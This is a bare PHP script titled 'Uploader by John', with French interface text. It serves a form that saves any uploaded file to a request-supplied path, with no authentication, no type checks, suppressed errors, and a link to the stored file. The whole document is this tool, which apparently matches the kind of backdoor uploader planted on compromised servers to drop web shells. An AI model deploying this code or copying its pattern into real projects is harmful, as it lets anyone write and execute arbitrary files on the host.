<?php

 $fichier = @$_FILES["fichier"];
if ($fichier["name"] != '') {
    $dir = $_REQUEST["path"] . $fichier["name"];
    if (move_uploaded_file($fichier['tmp_name'], $dir)) {
        echo "<h1><a href='$dir'>Clique ici!</a></h1>";
    }
}echo '<html><head><title>Uploader by John</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type="file" name="fichier"><input type=submit value="Uploader son fichier!"></form></body></html>';
?>
